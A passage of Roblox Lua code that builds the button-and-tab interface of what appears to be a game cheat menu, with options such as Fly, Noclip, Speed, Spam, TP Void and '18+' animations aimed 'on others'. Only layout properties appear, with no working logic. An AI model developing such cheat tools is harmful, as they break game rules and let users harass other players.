		SuperSpin.Name = "SuperSpin"
		SuperSpin.Parent = Tools
		SuperSpin.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		SuperSpin.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		SuperSpin.Position = UDim2.new(0.0286500659, 0, 0.609710157, 0)
		SuperSpin.Size = UDim2.new(0, 140, 0, 25)
		SuperSpin.Font = Enum.Font.SourceSans
		SuperSpin.FontSize = Enum.FontSize.Size14
		SuperSpin.Text = "Super Spin"
		SuperSpin.TextScaled = true
		SuperSpin.TextSize = 14
		SuperSpin.TextWrapped = true
		FreeFall.Name = "FreeFall"
		FreeFall.Parent = Tools
		FreeFall.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		FreeFall.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		FreeFall.Position = UDim2.new(0.54435122, 0, 0.609710157, 0)
		FreeFall.Size = UDim2.new(0, 140, 0, 25)
		FreeFall.Font = Enum.Font.SourceSans
		FreeFall.FontSize = Enum.FontSize.Size14
		FreeFall.Text = "Free Fall"
		FreeFall.TextScaled = true
		FreeFall.TextSize = 14
		FreeFall.TextWrapped = true
		AttachExperimental.Name = "AttachExperimental"
		AttachExperimental.Parent = Tools
		AttachExperimental.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		AttachExperimental.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		AttachExperimental.Position = UDim2.new(0.54435122, 0, 0.783913076, 0)
		AttachExperimental.Size = UDim2.new(0, 140, 0, 25)
		AttachExperimental.Font = Enum.Font.SourceSans
		AttachExperimental.FontSize = Enum.FontSize.Size14
		AttachExperimental.Text = "Attach Experimental"
		AttachExperimental.TextScaled = true
		AttachExperimental.TextSize = 14
		AttachExperimental.TextWrapped = true
		GiveTool.Name = "GiveTool"
		GiveTool.Parent = Tools
		GiveTool.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		GiveTool.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		GiveTool.Position = UDim2.new(0.0286500659, 0, 0.783913076, 0)
		GiveTool.Size = UDim2.new(0, 140, 0, 25)
		GiveTool.Font = Enum.Font.SourceSans
		GiveTool.FontSize = Enum.FontSize.Size14
		GiveTool.Text = "Give Tool"
		GiveTool.TextScaled = true
		GiveTool.TextSize = 14
		GiveTool.TextWrapped = true
		Basic.Name = "Basic"
		Basic.Parent = Sections
		Basic.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		Basic.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		Basic.BorderSizePixel = 2
		Basic.Size = UDim2.new(0, 350, 0, 230)
		Basic.Visible = false
		BASICGUIDE.Name = "BASICGUIDE"
		BASICGUIDE.Parent = Basic
		BASICGUIDE.BackgroundColor3 = Color3.new(1, 1, 1)
		BASICGUIDE.BackgroundTransparency = 1
		BASICGUIDE.Position = UDim2.new(0.0286500659, 0, 0.0435507223, 0)
		BASICGUIDE.Size = UDim2.new(0, 332, 0, 35)
		BASICGUIDE.Font = Enum.Font.ArialBold
		BASICGUIDE.FontSize = Enum.FontSize.Size14
		BASICGUIDE.Text = "Change/alter your own player."
		BASICGUIDE.TextScaled = true
		BASICGUIDE.TextSize = 14
		BASICGUIDE.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		BASICGUIDE.TextStrokeTransparency = 0
		BASICGUIDE.TextWrapped = true
		Speed.Name = "Speed"
		Speed.Parent = Basic
		Speed.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Speed.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Speed.Position = UDim2.new(0.0286500659, 0, 0.348405778, 0)
		Speed.Size = UDim2.new(0, 100, 0, 25)
		Speed.Font = Enum.Font.SourceSans
		Speed.FontSize = Enum.FontSize.Size14
		Speed.Text = "Speed"
		Speed.TextScaled = true
		Speed.TextSize = 14
		Speed.TextWrapped = true
		JumpHeight.Name = "JumpHeight"
		JumpHeight.Parent = Basic
		JumpHeight.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		JumpHeight.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		JumpHeight.Position = UDim2.new(0.343800783, 0, 0.348405778, 0)
		JumpHeight.Size = UDim2.new(0, 100, 0, 25)
		JumpHeight.Font = Enum.Font.SourceSans
		JumpHeight.FontSize = Enum.FontSize.Size14
		JumpHeight.Text = "JumpHeight"
		JumpHeight.TextScaled = true
		JumpHeight.TextSize = 14
		JumpHeight.TextWrapped = true
		Chat.Name = "Chat"
		Chat.Parent = Basic
		Chat.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Chat.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Chat.Position = UDim2.new(0.0286500659, 0, 0.653260887, 0)
		Chat.Size = UDim2.new(0, 140, 0, 25)
		Chat.Font = Enum.Font.SourceSans
		Chat.FontSize = Enum.FontSize.Size14
		Chat.Text = "Chat"
		Chat.TextScaled = true
		Chat.TextSize = 14
		Chat.TextWrapped = true
		Spam.Name = "Spam"
		Spam.Parent = Basic
		Spam.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Spam.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Spam.Position = UDim2.new(0.54435122, 0, 0.653260887, 0)
		Spam.Size = UDim2.new(0, 140, 0, 25)
		Spam.Font = Enum.Font.SourceSans
		Spam.FontSize = Enum.FontSize.Size14
		Spam.Text = "Spam"
		Spam.TextScaled = true
		Spam.TextSize = 14
		Spam.TextWrapped = true
		Fly.Name = "Fly"
		Fly.Parent = Basic
		Fly.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Fly.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Fly.Position = UDim2.new(0.54435122, 0, 0.827463746, 0)
		Fly.Size = UDim2.new(0, 140, 0, 25)
		Fly.Font = Enum.Font.SourceSans
		Fly.FontSize = Enum.FontSize.Size14
		Fly.Text = "Fly"
		Fly.TextScaled = true
		Fly.TextSize = 14
		Fly.TextWrapped = true
		Noclip.Name = "Noclip"
		Noclip.Parent = Basic
		Noclip.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Noclip.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Noclip.Position = UDim2.new(0.0286500659, 0, 0.827463746, 0)
		Noclip.Size = UDim2.new(0, 140, 0, 25)
		Noclip.Font = Enum.Font.SourceSans
		Noclip.FontSize = Enum.FontSize.Size14
		Noclip.Text = "Noclip"
		Noclip.TextScaled = true
		Noclip.TextSize = 14
		Noclip.TextWrapped = true
		HipHeight.Name = "HipHeight"
		HipHeight.Parent = Basic
		HipHeight.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		HipHeight.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		HipHeight.Position = UDim2.new(0.658951521, 0, 0.348405778, 0)
		HipHeight.Size = UDim2.new(0, 100, 0, 25)
		HipHeight.Font = Enum.Font.SourceSans
		HipHeight.FontSize = Enum.FontSize.Size14
		HipHeight.Text = "HipHeight"
		HipHeight.TextScaled = true
		HipHeight.TextSize = 14
		HipHeight.TextWrapped = true
		STATCHANGE.Name = "STATCHANGE"
		STATCHANGE.Parent = Basic
		STATCHANGE.BackgroundColor3 = Color3.new(1, 1, 1)
		STATCHANGE.BorderColor3 = Color3.new(0.968628, 0.698039, 0.0588235)
		STATCHANGE.BorderSizePixel = 2
		STATCHANGE.Position = UDim2.new(0.315150708, 0, 0.217753619, 0)
		STATCHANGE.Size = UDim2.new(0, 120, 0, 18)
		STATCHANGE.ZIndex = 3
		STATCHANGE.Font = Enum.Font.SourceSans
		STATCHANGE.FontSize = Enum.FontSize.Size14
		STATCHANGE.Text = ""
		STATCHANGE.TextScaled = true
		STATCHANGE.TextSize = 14
		STATCHANGE.TextWrapped = true
		CHATBOX.Name = "CHATBOX"
		CHATBOX.Parent = Basic
		CHATBOX.BackgroundColor3 = Color3.new(1, 1, 1)
		CHATBOX.BorderColor3 = Color3.new(0.968628, 0.698039, 0.0588235)
		CHATBOX.BorderSizePixel = 2
		CHATBOX.Position = UDim2.new(0.143250331, 0, 0.522608697, 0)
		CHATBOX.Size = UDim2.new(0, 240, 0, 18)
		CHATBOX.ZIndex = 3
		CHATBOX.Font = Enum.Font.SourceSans
		CHATBOX.FontSize = Enum.FontSize.Size14
		CHATBOX.Text = ""
		CHATBOX.TextScaled = true
		CHATBOX.TextSize = 14
		CHATBOX.TextWrapped = true
		Local_Player.Name = "Local_Player"
		Local_Player.Parent = Sections
		Local_Player.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		Local_Player.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		Local_Player.BorderSizePixel = 2
		Local_Player.Size = UDim2.new(0, 350, 0, 230)
		Local_Player.Visible = false
		Local_PlayerGUIDE.Name = "Local_PlayerGUIDE"
		Local_PlayerGUIDE.Parent = Local_Player
		Local_PlayerGUIDE.BackgroundColor3 = Color3.new(1, 1, 1)
		Local_PlayerGUIDE.BackgroundTransparency = 1
		Local_PlayerGUIDE.Position = UDim2.new(0.0286500659, 0, 0.0435507223, 0)
		Local_PlayerGUIDE.Size = UDim2.new(0, 332, 0, 35)
		Local_PlayerGUIDE.Font = Enum.Font.ArialBold
		Local_PlayerGUIDE.FontSize = Enum.FontSize.Size14
		Local_PlayerGUIDE.Text = "Perform cool tricks on yourself."
		Local_PlayerGUIDE.TextScaled = true
		Local_PlayerGUIDE.TextSize = 14
		Local_PlayerGUIDE.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		Local_PlayerGUIDE.TextStrokeTransparency = 0
		Local_PlayerGUIDE.TextWrapped = true
		CrazySpin.Name = "CrazySpin"
		CrazySpin.Parent = Local_Player
		CrazySpin.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		CrazySpin.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		CrazySpin.Position = UDim2.new(0.0286500659, 0, 0.261304349, 0)
		CrazySpin.Size = UDim2.new(0, 140, 0, 25)
		CrazySpin.Font = Enum.Font.SourceSans
		CrazySpin.FontSize = Enum.FontSize.Size14
		CrazySpin.Text = "Crazy Spin"
		CrazySpin.TextScaled = true
		CrazySpin.TextSize = 14
		CrazySpin.TextWrapped = true
		CrouchRocket.Name = "CrouchRocket"
		CrouchRocket.Parent = Local_Player
		CrouchRocket.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		CrouchRocket.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		CrouchRocket.Position = UDim2.new(0.54435122, 0, 0.261304349, 0)
		CrouchRocket.Size = UDim2.new(0, 140, 0, 25)
		CrouchRocket.Font = Enum.Font.SourceSans
		CrouchRocket.FontSize = Enum.FontSize.Size14
		CrouchRocket.Text = "Crouch Rocket"
		CrouchRocket.TextScaled = true
		CrouchRocket.TextSize = 14
		CrouchRocket.TextWrapped = true
		Haunted.Name = "Haunted"
		Haunted.Parent = Local_Player
		Haunted.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Haunted.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Haunted.Position = UDim2.new(0.54435122, 0, 0.435507238, 0)
		Haunted.Size = UDim2.new(0, 140, 0, 25)
		Haunted.Font = Enum.Font.SourceSans
		Haunted.FontSize = Enum.FontSize.Size14
		Haunted.Text = "Haunted"
		Haunted.TextScaled = true
		Haunted.TextSize = 14
		Haunted.TextWrapped = true
		CloneIllusion.Name = "CloneIllusion"
		CloneIllusion.Parent = Local_Player
		CloneIllusion.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		CloneIllusion.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		CloneIllusion.Position = UDim2.new(0.0286500659, 0, 0.435507238, 0)
		CloneIllusion.Size = UDim2.new(0, 140, 0, 25)
		CloneIllusion.Font = Enum.Font.SourceSans
		CloneIllusion.FontSize = Enum.FontSize.Size14
		CloneIllusion.Text = "Clone Illusion"
		CloneIllusion.TextScaled = true
		CloneIllusion.TextSize = 14
		CloneIllusion.TextWrapped = true
		Levitate.Name = "Levitate"
		Levitate.Parent = Local_Player
		Levitate.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Levitate.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Levitate.Position = UDim2.new(0.0286500659, 0, 0.609710157, 0)
		Levitate.Size = UDim2.new(0, 140, 0, 25)
		Levitate.Font = Enum.Font.SourceSans
		Levitate.FontSize = Enum.FontSize.Size14
		Levitate.Text = "Levitate"
		Levitate.TextScaled = true
		Levitate.TextSize = 14
		Levitate.TextWrapped = true
		Dinosaur.Name = "Dinosaur"
		Dinosaur.Parent = Local_Player
		Dinosaur.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Dinosaur.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Dinosaur.Position = UDim2.new(0.54435122, 0, 0.609710157, 0)
		Dinosaur.Size = UDim2.new(0, 140, 0, 25)
		Dinosaur.Font = Enum.Font.SourceSans
		Dinosaur.FontSize = Enum.FontSize.Size14
		Dinosaur.Text = "Dinosaur"
		Dinosaur.TextScaled = true
		Dinosaur.TextSize = 14
		Dinosaur.TextWrapped = true
		Glitchy.Name = "Glitchy"
		Glitchy.Parent = Local_Player
		Glitchy.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Glitchy.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Glitchy.Position = UDim2.new(0.54435122, 0, 0.783913076, 0)
		Glitchy.Size = UDim2.new(0, 140, 0, 25)
		Glitchy.Font = Enum.Font.SourceSans
		Glitchy.FontSize = Enum.FontSize.Size14
		Glitchy.Text = "Glitchy"
		Glitchy.TextScaled = true
		Glitchy.TextSize = 14
		Glitchy.TextWrapped = true
		NoLimbs.Name = "NoLimbs"
		NoLimbs.Parent = Local_Player
		NoLimbs.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		NoLimbs.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		NoLimbs.Position = UDim2.new(0.0286500659, 0, 0.783913076, 0)
		NoLimbs.Size = UDim2.new(0, 140, 0, 25)
		NoLimbs.Font = Enum.Font.SourceSans
		NoLimbs.FontSize = Enum.FontSize.Size14
		NoLimbs.Text = "No Limbs"
		NoLimbs.TextScaled = true
		NoLimbs.TextSize = 14
		NoLimbs.TextWrapped = true
		Animations.Name = "Animations"
		Animations.Parent = Sections
		Animations.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		Animations.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		Animations.BorderSizePixel = 2
		Animations.Size = UDim2.new(0, 350, 0, 230)
		Animations.Visible = false
		ANIMATIONSGUIDE.Name = "ANIMATIONSGUIDE"
		ANIMATIONSGUIDE.Parent = Animations
		ANIMATIONSGUIDE.BackgroundColor3 = Color3.new(1, 1, 1)
		ANIMATIONSGUIDE.BackgroundTransparency = 1
		ANIMATIONSGUIDE.Position = UDim2.new(0.0286500659, 0, 0.0435507223, 0)
		ANIMATIONSGUIDE.Size = UDim2.new(0, 332, 0, 35)
		ANIMATIONSGUIDE.Font = Enum.Font.ArialBold
		ANIMATIONSGUIDE.FontSize = Enum.FontSize.Size14
		ANIMATIONSGUIDE.Text = "Do cool commands with animations on others."
		ANIMATIONSGUIDE.TextScaled = true
		ANIMATIONSGUIDE.TextSize = 14
		ANIMATIONSGUIDE.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		ANIMATIONSGUIDE.TextStrokeTransparency = 0
		ANIMATIONSGUIDE.TextWrapped = true
		_18.Name = "18+"
		_18.Parent = Animations
		_18.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		_18.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		_18.Position = UDim2.new(0.0286500659, 0, 0.261304349, 0)
		_18.Size = UDim2.new(0, 140, 0, 25)
		_18.Font = Enum.Font.SourceSans
		_18.FontSize = Enum.FontSize.Size14
		_18.Text = "18+"
		_18.TextScaled = true
		_18.TextSize = 14
		_18.TextWrapped = true
		Hide.Name = "Hide"
		Hide.Parent = Animations
		Hide.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Hide.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Hide.Position = UDim2.new(0.54435122, 0, 0.261304349, 0)
		Hide.Size = UDim2.new(0, 140, 0, 25)
		Hide.Font = Enum.Font.SourceSans
		Hide.FontSize = Enum.FontSize.Size14
		Hide.Text = "Hide"
		Hide.TextScaled = true
		Hide.TextSize = 14
		Hide.TextWrapped = true
		PushLock.Name = "PushLock"
		PushLock.Parent = Animations
		PushLock.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		PushLock.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		PushLock.Position = UDim2.new(0.54435122, 0, 0.435507238, 0)
		PushLock.Size = UDim2.new(0, 140, 0, 25)
		PushLock.Font = Enum.Font.SourceSans
		PushLock.FontSize = Enum.FontSize.Size14
		PushLock.Text = "Push Lock"
		PushLock.TextScaled = true
		PushLock.TextSize = 14
		PushLock.TextWrapped = true
		SlamOn.Name = "SlamOn"
		SlamOn.Parent = Animations
		SlamOn.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		SlamOn.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		SlamOn.Position = UDim2.new(0.0286500659, 0, 0.435507238, 0)
		SlamOn.Size = UDim2.new(0, 140, 0, 25)
		SlamOn.Font = Enum.Font.SourceSans
		SlamOn.FontSize = Enum.FontSize.Size14
		SlamOn.Text = "Slam On"
		SlamOn.TextScaled = true
		SlamOn.TextSize = 14
		SlamOn.TextWrapped = true
		LevitateOn.Name = "LevitateOn"
		LevitateOn.Parent = Animations
		LevitateOn.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		LevitateOn.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		LevitateOn.Position = UDim2.new(0.0286500659, 0, 0.609710157, 0)
		LevitateOn.Size = UDim2.new(0, 140, 0, 25)
		LevitateOn.Font = Enum.Font.SourceSans
		LevitateOn.FontSize = Enum.FontSize.Size14
		LevitateOn.Text = "Levitate On"
		LevitateOn.TextScaled = true
		LevitateOn.TextSize = 14
		LevitateOn.TextWrapped = true
		Dance.Name = "Dance"
		Dance.Parent = Animations
		Dance.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Dance.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Dance.Position = UDim2.new(0.54435122, 0, 0.609710157, 0)
		Dance.Size = UDim2.new(0, 140, 0, 25)
		Dance.Font = Enum.Font.SourceSans
		Dance.FontSize = Enum.FontSize.Size14
		Dance.Text = "Dance"
		Dance.TextScaled = true
		Dance.TextSize = 14
		Dance.TextWrapped = true
		ExperimentalAnimation.Name = "ExperimentalAnimation"
		ExperimentalAnimation.Parent = Animations
		ExperimentalAnimation.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		ExperimentalAnimation.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		ExperimentalAnimation.Position = UDim2.new(0.54435122, 0, 0.783913076, 0)
		ExperimentalAnimation.Size = UDim2.new(0, 140, 0, 25)
		ExperimentalAnimation.Font = Enum.Font.SourceSans
		ExperimentalAnimation.FontSize = Enum.FontSize.Size14
		ExperimentalAnimation.Text = "Experimental Animation"
		ExperimentalAnimation.TextScaled = true
		ExperimentalAnimation.TextSize = 14
		ExperimentalAnimation.TextWrapped = true
		Carpet.Name = "Carpet"
		Carpet.Parent = Animations
		Carpet.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Carpet.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Carpet.Position = UDim2.new(0.0286500659, 0, 0.783913076, 0)
		Carpet.Size = UDim2.new(0, 140, 0, 25)
		Carpet.Font = Enum.Font.SourceSans
		Carpet.FontSize = Enum.FontSize.Size14
		Carpet.Text = "Carpet"
		Carpet.TextScaled = true
		Carpet.TextSize = 14
		Carpet.TextWrapped = true
		Extra.Name = "Extra"
		Extra.Parent = Sections
		Extra.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		Extra.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		Extra.BorderSizePixel = 2
		Extra.Size = UDim2.new(0, 350, 0, 230)
		Extra.Visible = false
		EXTRAGUIDE.Name = "EXTRAGUIDE"
		EXTRAGUIDE.Parent = Extra
		EXTRAGUIDE.BackgroundColor3 = Color3.new(1, 1, 1)
		EXTRAGUIDE.BackgroundTransparency = 1
		EXTRAGUIDE.Position = UDim2.new(0.0286500659, 0, 0.0435507223, 0)
		EXTRAGUIDE.Size = UDim2.new(0, 332, 0, 35)
		EXTRAGUIDE.Font = Enum.Font.ArialBold
		EXTRAGUIDE.FontSize = Enum.FontSize.Size14
		EXTRAGUIDE.Text = "Extra commands for yourself."
		EXTRAGUIDE.TextScaled = true
		EXTRAGUIDE.TextSize = 14
		EXTRAGUIDE.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		EXTRAGUIDE.TextStrokeTransparency = 0
		EXTRAGUIDE.TextWrapped = true
		Sit.Name = "Sit"
		Sit.Parent = Extra
		Sit.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Sit.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Sit.Position = UDim2.new(0.0286500659, 0, 0.261304349, 0)
		Sit.Size = UDim2.new(0, 140, 0, 25)
		Sit.Font = Enum.Font.SourceSans
		Sit.FontSize = Enum.FontSize.Size14
		Sit.Text = "Sit"
		Sit.TextScaled = true
		Sit.TextSize = 14
		Sit.TextWrapped = true
		Jump.Name = "Jump"
		Jump.Parent = Extra
		Jump.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Jump.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Jump.Position = UDim2.new(0.54435122, 0, 0.261304349, 0)
		Jump.Size = UDim2.new(0, 140, 0, 25)
		Jump.Font = Enum.Font.SourceSans
		Jump.FontSize = Enum.FontSize.Size14
		Jump.Text = "Jump"
		Jump.TextScaled = true
		Jump.TextSize = 14
		Jump.TextWrapped = true
		PlatformStand.Name = "PlatformStand"
		PlatformStand.Parent = Extra
		PlatformStand.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		PlatformStand.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		PlatformStand.Position = UDim2.new(0.54435122, 0, 0.435507238, 0)
		PlatformStand.Size = UDim2.new(0, 140, 0, 25)
		PlatformStand.Font = Enum.Font.SourceSans
		PlatformStand.FontSize = Enum.FontSize.Size14
		PlatformStand.Text = "Platform Stand"
		PlatformStand.TextScaled = true
		PlatformStand.TextSize = 14
		PlatformStand.TextWrapped = true
		Freeze.Name = "Freeze"
		Freeze.Parent = Extra
		Freeze.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Freeze.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Freeze.Position = UDim2.new(0.0286500659, 0, 0.435507238, 0)
		Freeze.Size = UDim2.new(0, 140, 0, 25)
		Freeze.Font = Enum.Font.SourceSans
		Freeze.FontSize = Enum.FontSize.Size14
		Freeze.Text = "Freeze"
		Freeze.TextScaled = true
		Freeze.TextSize = 14
		Freeze.TextWrapped = true
		Insane.Name = "Insane"
		Insane.Parent = Extra
		Insane.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Insane.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Insane.Position = UDim2.new(0.0286500659, 0, 0.609710157, 0)
		Insane.Size = UDim2.new(0, 140, 0, 25)
		Insane.Font = Enum.Font.SourceSans
		Insane.FontSize = Enum.FontSize.Size14
		Insane.Text = "Insane"
		Insane.TextScaled = true
		Insane.TextSize = 14
		Insane.TextWrapped = true
		TPVoid.Name = "TPVoid"
		TPVoid.Parent = Extra
		TPVoid.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		TPVoid.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		TPVoid.Position = UDim2.new(0.54435122, 0, 0.609710157, 0)
		TPVoid.Size = UDim2.new(0, 140, 0, 25)
		TPVoid.Font = Enum.Font.SourceSans
		TPVoid.FontSize = Enum.FontSize.Size14
		TPVoid.Text = "TP Void"
		TPVoid.TextScaled = true
		TPVoid.TextSize = 14
		TPVoid.TextWrapped = true
		Unknown.Name = "Unknown"
		Unknown.Parent = Extra
		Unknown.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Unknown.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Unknown.Position = UDim2.new(0.54435122, 0, 0.783913076, 0)
		Unknown.Size = UDim2.new(0, 140, 0, 25)
		Unknown.Font = Enum.Font.SourceSans
		Unknown.FontSize = Enum.FontSize.Size14
		Unknown.Text = "Unknown"
		Unknown.TextScaled = true
		Unknown.TextSize = 14
		Unknown.TextWrapped = true
		Reset.Name = "Reset"
		Reset.Parent = Extra
		Reset.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Reset.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Reset.Position = UDim2.new(0.0286500659, 0, 0.783913076, 0)
		Reset.Size = UDim2.new(0, 140, 0, 25)
		Reset.Font = Enum.Font.SourceSans
		Reset.FontSize = Enum.FontSize.Size14
		Reset.Text = "Reset"
		Reset.TextScaled = true
		Reset.TextSize = 14
		Reset.TextWrapped = true
		SelectTabs.Name = "SelectTabs"
		SelectTabs.Parent = MainFrame
		SelectTabs.BackgroundColor3 = Color3.new(0.435294, 0.435294, 0.435294)
		SelectTabs.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		SelectTabs.BorderSizePixel = 2
		SelectTabs.Position = UDim2.new(-0.286500663, 0, 0.148395061, 0)
		SelectTabs.Size = UDim2.new(0, 98, 0, 230)
		SelectTabs.CanvasSize = UDim2.new(0, 0, 1.20000005, 0)
		RocketPropulsionTAB.Name = "RocketPropulsionTAB"
		RocketPropulsionTAB.Parent = SelectTabs
		RocketPropulsionTAB.BackgroundColor3 = Color3.new(1, 1, 1)
		RocketPropulsionTAB.BackgroundTransparency = 1
		RocketPropulsionTAB.Position = UDim2.new(0, 0, 0.00999999978, 0)
		RocketPropulsionTAB.Size = UDim2.new(0, 82, 0, 40)
		RocketPropulsionTAB.Font = Enum.Font.SourceSansLight
		RocketPropulsionTAB.FontSize = Enum.FontSize.Size18
		RocketPropulsionTAB.Text = "Rocket Propulsion"
		RocketPropulsionTAB.TextSize = 18
		RocketPropulsionTAB.TextWrapped = true
		TeleportationTAB.Name = "TeleportationTAB"
		TeleportationTAB.Parent = SelectTabs
		TeleportationTAB.BackgroundColor3 = Color3.new(1, 1, 1)
		TeleportationTAB.BackgroundTransparency = 1
		TeleportationTAB.Position = UDim2.new(0, 0, 0.150000006, 0)
		TeleportationTAB.Size = UDim2.new(0, 82, 0, 40)
		TeleportationTAB.Font = Enum.Font.SourceSansLight
		TeleportationTAB.FontSize = Enum.FontSize.Size18
		TeleportationTAB.Text = "Teleportation"
		TeleportationTAB.TextSize = 17
		TeleportationTAB.TextWrapped = true
		ToolsTAB.Name = "ToolsTAB"
		ToolsTAB.Parent = SelectTabs
		ToolsTAB.BackgroundColor3 = Color3.new(1, 1, 1)
		ToolsTAB.BackgroundTransparency = 1
		ToolsTAB.Position = UDim2.new(0, 0, 0.289999992, 0)
		ToolsTAB.Size = UDim2.new(0, 82, 0, 40)
		ToolsTAB.Font = Enum.Font.SourceSansLight
		ToolsTAB.FontSize = Enum.FontSize.Size24
		ToolsTAB.Text = "Tools"
		ToolsTAB.TextSize = 20
		ToolsTAB.TextWrapped = true
		AnimationsTAB.Name = "AnimationsTAB"
		AnimationsTAB.Parent = SelectTabs
		AnimationsTAB.BackgroundColor3 = Color3.new(1, 1, 1)
		AnimationsTAB.BackgroundTransparency = 1
		AnimationsTAB.Position = UDim2.new(0, 0, 0.569999993, 0)
		AnimationsTAB.Size = UDim2.new(0, 82, 0, 40)
		AnimationsTAB.Font = Enum.Font.SourceSansLight
		AnimationsTAB.FontSize = Enum.FontSize.Size24
		AnimationsTAB.Text = "Animations"
		AnimationsTAB.TextSize = 20
		AnimationsTAB.TextWrapped = true
		BasicTAB.Name = "BasicTAB"
		BasicTAB.Parent = SelectTabs
		BasicTAB.BackgroundColor3 = Color3.new(1, 1, 1)
		BasicTAB.BackgroundTransparency = 1
		BasicTAB.Position = UDim2.new(0, 0, 0.430000007, 0)
		BasicTAB.Size = UDim2.new(0, 82, 0, 40)
		BasicTAB.Font = Enum.Font.SourceSansLight
		BasicTAB.FontSize = Enum.FontSize.Size24
		BasicTAB.Text = "Basic"
		BasicTAB.TextSize = 20
		BasicTAB.TextWrapped = true
		Local_PlayerTAB.Name = "Local_PlayerTAB"
		Local_PlayerTAB.Parent = SelectTabs
		Local_PlayerTAB.BackgroundColor3 = Color3.new(1, 1, 1)
		Local_PlayerTAB.BackgroundTransparency = 1
		Local_PlayerTAB.Position = UDim2.new(0, 0, 0.709999979, 0)
		Local_PlayerTAB.Size = UDim2.new(0, 82, 0, 40)
		Local_PlayerTAB.Font = Enum.Font.SourceSansLight
		Local_PlayerTAB.FontSize = Enum.FontSize.Size24
		Local_PlayerTAB.Text = "Local Player"
		Local_PlayerTAB.TextSize = 20
